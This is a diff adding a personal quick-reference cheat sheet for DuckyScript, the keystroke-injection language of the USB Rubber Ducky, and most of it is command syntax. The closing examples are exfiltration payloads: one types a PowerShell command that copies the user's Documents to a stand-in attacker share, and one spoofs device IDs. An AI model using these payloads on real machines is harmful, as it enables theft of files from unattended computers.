@@ -1,0 +1,161 @@
+https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference
+
+
+* Misc.
+STRING
+STRINLN
+
+STRING
+	text
+END_STRING
+
+REM
+
+REM_BLOCK XXX
+	text
+END_REM
+
+DELAY
+
+String Prompt text example
+WAIT_FOR_BUTTON_PRESS
+String Continuing the payload 
+
+RESTART_PAYLOAD
+STOP_PAYLOAD
+
+$_OS
+
+* Cursor Keys
+UP DOWN LEFT RIGHT
+UPARROW DOWNARROW LEFTARROW RIGHTARROW
+PAGEUP PAGEDOWN HOME END
+INSERT DELETE DEL BACKSPACE
+TAB
+SPACE
+
+* System Keys 
+ENTER
+ESCAPE
+PAUSE BREAK
+PRINTSCREEN
+MENU APP
+F1 F2 F3 F4 F5 F6 F7 F8 F9 F0 F11 F12
+
+* Modifier Keys 
+SHIFT
+ALT
+CONTROL or CTRL
+COMMAND
+WINDOWS or GUI
+CAPSLOCK
+NUMLOCK
+SCROLLOCK
+
+* Use INJECT_MOD when using modifier key alone 
+
+* Attack Modes
+1. HID 
+	Functions as Human Interface Device (keyboard)
+2. Storage 
+	Functions as Storage medium for transfering files
+3. Off
+	Will not function as any device
+
+* Combos
+GUI r
+ALT F4
+CTRL SHIFT
+ALT SHIFT
+COMMAND CTRL
+COMMAND CTRL SHIFT
+COMMAND OPTION
+COMMAND OPTION SHIFT
+CONTROL ALT DELETE
+ATTACKMODE HID STORAGE
+
+ATTACKMODE HID VID_046D PID_C31C MAN_HAK5 PROD_DUCKY SERIAL_1337
+REM Emulated a Keyboard with the following values:
+REM  - Vendor ID: 046D
+REM  - Product ID: C31C
+REM  - Manufacturer: HAK5
+REM  - Product: DUCKY
+REM  - Serial: 1337
+
+* Constants
+DEFINE #WAIT 2000
+DEFINE #MYURL example.com
+DELAY #WAIT
+STRINGLN #TEXT
+STRING https://#MYURL
+
+* Variables 
+VAR $BLINK = TRUE
+VAR $BLINK_TIME = 1000
+
+* Conditionals 
+IF ( $_CAPSLOCK_ON == TRUE ) THEN
+    STRING Capslock is on!
+ELSE IF ( $_CAPSLOCK_ON == FALSE ) THEN
+    STRING Capslock is off!
+END_IF
+
+* While loops
+VAR $FOO = 42
+WHILE ( $FOO > 0 )
+    STRINGLN This message will repeat 42 times.
+    $FOO = ( $FOO - 1 )
+END_WHILE
+
+* Functions 
+REM Types "Hello.....World!"
+
+FUNCTION COUNTDOWN()
+    WHILE ($TIMER > 0)
+        STRING .
+        $TIMER = ($TIMER - 1)
+        DELAY 500
+    END_WHILE
+END_FUNCTION
+
+STRING Hello
+VAR $TIMER = 5
+COUNTDOWN()
+STRING World!
+
+* Random
+RANDOM_LOWERCASE_LETTER
+RANDOM_UPPERCASE_LETTER
+RANDOM_LETTER
+RANDOM_NUMBER
+RANDOM_SPECIAL
+RANDOM_CHAR
+VID_RANDOM
+PID_RANDOM
+MAN_RANDOM
+PROD_RANDOM
+SERIAL_RANDOM
+
+* Internal variables 
+$_RANDOM_INT
+	returns value between $_RANDOM_MIN and $_RANDOM_MAX
+
+* Holding keys 
+HOLD a 
+DALEY(200)
+RELEASE a
+
+* Physical Exfiltration 
+ATTACKMODE HID STORAGE
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;
+STRINGLN echo $env:computername >> $m:\computer_names.txt"
+
+* Network Exfiltration
+ATTACKMODE HID
+DELAY 2000
+GUI r
+DELAY 100
+STRINGLN powershell "cp -r $env:USERPROFILE\Documents\* \\evilsmb\share"
